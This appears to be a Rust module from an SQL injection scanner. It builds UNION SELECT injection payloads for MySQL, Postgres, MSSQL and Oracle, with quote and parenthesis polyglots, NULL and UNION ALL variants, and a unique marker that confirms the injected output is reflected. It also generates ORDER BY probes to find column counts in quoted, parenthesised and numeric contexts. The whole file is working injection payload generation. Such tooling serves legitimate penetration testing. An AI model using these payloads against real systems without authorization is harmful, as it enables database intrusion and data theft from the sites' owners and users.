#![deny(unsafe_code)]

/// Union-based payloads per DBMS, with column count enumeration.
#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct UnionPayload {
    pub payload: String,
    pub dbms: String,
    pub columns: usize,
    /// Unique marker string embedded (quoted) in the last selected column so the
    /// caller can confirm this specific payload's output round-tripped through
    /// the response, rather than relying on an easily-collided literal.
    pub marker: String,
}

/// Build a comma-joined column list where every position is the numeric index
/// except `marker_pos` (1-indexed), which carries the quoted `marker` string.
fn cols_with_marker(columns: usize, marker_pos: usize, marker: &str) -> String {
    (1..=columns)
        .map(|i| {
            if i == marker_pos {
                format!("'{marker}'")
            } else {
                i.to_string()
            }
        })
        .collect::<Vec<_>>()
        .join(",")
}

#[must_use]
pub fn union_payloads_for(dbms: Option<&str>, columns: usize) -> Vec<UnionPayload> {
    let marker = format!(
        "u{}",
        uuid::Uuid::new_v4().simple().to_string()[..8].to_owned()
    );
    let cols = cols_with_marker(columns, columns, &marker);
    #[allow(clippy::match_same_arms)]
    let comment = match dbms {
        Some("mysql") => " -- -",
        Some("postgres") => " --",
        Some("mssql") => " --",
        Some("oracle") => " --",
        _ => " -- -",
    };
    // Second variant uses NULL as first column (bypassing type coercion issues)
    // while still carrying the marker in the last column.
    let cols_null = if columns <= 1 {
        format!("'{marker}'")
    } else {
        let tail = (2..columns)
            .map(|i| i.to_string())
            .collect::<Vec<_>>()
            .join(",");
        if tail.is_empty() {
            format!("NULL,'{marker}'")
        } else {
            format!("NULL,{tail},'{marker}'")
        }
    };
    // P0-1: head polyglot closes `'`, `"` and `()))` at once; the mirrored
    // double-quote variant sits at index 5 so L1 (`budget(level, 1, …)`)
    // keeps probing a single quoted UNION first. `UNION ALL` bypasses
    // dedup/distinct filters, `"` covers double-quoted contexts and the
    // numeric `1 UNION …` (leading `1` value, no quote) covers integer
    // parameters. Paren closings (`)`, `))`) are covered by the polyglots
    // for UNION; explicit `)`/`))` variants live in `order_by_payloads`.
    let from_dual = matches!(dbms, Some("oracle"));
    let select = |kind: &str, c: &str| {
        if from_dual {
            format!("{kind} {c} FROM dual{comment}")
        } else {
            format!("{kind} {c}{comment}")
        }
    };
    let union_cols = select("UNION SELECT", &cols);
    let union_null = select("UNION SELECT", &cols_null);
    let union_all_cols = select("UNION ALL SELECT", &cols);
    let union_all_null = select("UNION ALL SELECT", &cols_null);
    let label: &str = match dbms {
        Some("mysql") => "mysql",
        Some("postgres") => "postgres",
        Some("mssql") => "mssql",
        Some("oracle") => "oracle",
        _ => "generic",
    };
    // (prefix + select-core): prefix is prepended verbatim; numeric uses a
    // leading `1` value since payloads replace the parameter value.
    let base: Vec<(String, &str)> = vec![
        (format!("'\"())) {union_cols}"), label),
        (format!("' {union_cols}"), label),
        (format!("' {union_null}"), label),
        (format!("' {union_all_cols}"), label),
        (format!("' {union_all_null}"), label),
        (format!("\"'())) {union_cols}"), label),
        (format!("\" {union_cols}"), label),
        (format!("1 {union_cols}"), label),
    ];
    base.into_iter()
        .map(|(p, d)| UnionPayload {
            payload: p,
            dbms: d.to_owned(),
            columns,
            marker: marker.clone(),
        })
        .collect()
}

/// Injection contexts probed by ORDER BY enumeration: quote closings plus
/// numeric. Empty prefix means numeric context (payload carries its own
/// leading `1` value since it replaces the parameter value).
#[must_use]
pub fn order_by_context_prefixes() -> Vec<&'static str> {
    vec!["'", "\"", ")", "))", ""]
}

/// Build a single ORDER BY probe for `prefix` (`""` = numeric) at `index`.
#[must_use]
pub fn order_by_payload_for(prefix: &str, index: usize) -> String {
    if prefix.is_empty() {
        format!("1 ORDER BY {index} -- -")
    } else {
        format!("{prefix} ORDER BY {index} -- -")
    }
}

/// Generate ORDER BY enumeration payloads to discover column count.
///
/// Prefix-major order: the first `max_cols` entries are the historical
/// `' ORDER BY i -- -` block (byte-identical default), followed by `"`
/// then `)` then `))` then numeric. Extends the historical single-quote
/// enumeration to double-quote, paren and integer contexts.
#[must_use]
pub fn order_by_payloads(max_cols: usize) -> Vec<String> {
    let mut out = Vec::new();
    for prefix in order_by_context_prefixes() {
        for i in 1..=max_cols {
            out.push(order_by_payload_for(prefix, i));
        }
    }
    out
}
